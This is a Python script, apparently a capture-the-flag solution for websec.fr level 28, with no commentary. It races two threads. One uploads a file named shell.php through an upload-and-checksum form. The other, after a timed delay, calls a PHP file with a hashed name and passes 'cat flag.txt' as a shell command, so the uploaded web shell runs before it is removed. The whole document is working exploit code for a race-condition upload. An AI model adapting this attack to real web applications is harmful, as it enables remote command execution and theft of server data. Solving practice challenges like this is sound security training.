import time
import requests
import threading

def one():

    url = 'http://websec.fr/level28/index.php'
    files = {'flag_file': open('shell.php', 'rb'), 'checksum':(None,'f'), 'submit':(None,'Upload and check')}
    
    start = time.time()
    response = requests.post(url, files=files)
    end = time.time()
    
    print('one', start, end, response.cookies.get_dict())


def two():

    url = 'http://websec.fr/level28/f3959b484667e8ab56a4e0cafba2b430.php?c=cat+flag.txt'
    
    start = time.time()
    response = requests.get(url)
    end = time.time()
    
    print('two', start, end, response.cookies.get_dict())

t1 = threading.Thread(target=one)
t2 = threading.Thread(target=two)

t1.start()
time.sleep(1.6)
t2.start()

